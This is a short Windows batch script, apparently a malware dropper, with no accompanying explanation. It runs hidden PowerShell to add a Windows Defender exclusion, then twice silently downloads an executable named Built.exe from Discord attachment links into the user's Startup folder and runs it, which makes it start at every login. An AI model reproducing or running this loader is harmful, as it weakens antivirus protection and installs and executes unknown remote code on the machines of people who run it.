powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1144030799310635046/1160209144737955910/Built.exe?ex=6533d3f7&is=65215ef7&hm=5d978d76d31c59f4c1c9fa6eb7d4d752747cf0d9eb1b723b4923cca8b79d5aab&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1175204753647599718/1194304958942687304/Built.exe?ex=65afde2b&is=659d692b&hm=3bfce4a5cf5fd43c08d2f625760eb71a5f78eb4f648bc1c05587223c2381076f&"

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"
